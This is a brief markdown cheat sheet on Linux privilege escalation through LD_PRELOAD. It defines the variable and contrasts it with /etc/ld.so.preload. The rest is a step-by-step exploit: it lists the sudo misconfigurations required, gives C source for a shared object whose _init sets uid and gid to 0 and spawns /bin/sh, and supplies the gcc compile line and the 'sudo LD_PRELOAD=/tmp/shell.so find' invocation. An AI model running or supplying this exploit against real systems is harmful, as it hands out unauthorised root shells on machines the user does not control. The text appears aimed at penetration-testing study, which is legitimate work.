## What is LD_PRELOAD?

LD_PRELOAD is an environment variable in Linux that specifies a shared library to be loaded before any other libraries. It is used to override functions in the default libraries with custom implementations.

## LD_PRELOAD vs /etc/ld.so.preload 
- `/etc/ld.so.preload` is a system-wide configuration file (root permissions required) that applies to all processes and affects the entire system.   
- `LD_PRELOAD`, on the other hand, is an environment variable that allows individual users to specify libraries to be preloaded for a specific executable or command on a per-process basis. Therefore, you donâ€™t need to be root to use it.   
>Libraries defined by LD_PRELOAD are loaded prior to those in /etc/ld.so.preload. 

## How to ?
Pre-requisites:  

- [x] NOPASSWD  
- [x] env_keep += LD_PRELOAD  

Search for writable shared objects file
```
ldd <BINARY>
```
Create malicious `.so`
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/sh");
}
```
Compile `.so`
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
Execute any binary with the LD_PRELOAD
```
sudo LD_PRELOAD=<PATH_TO_.so_FILE> <PROGRAM>
sudo LD_PRELOAD=/tmp/shell.so find
```
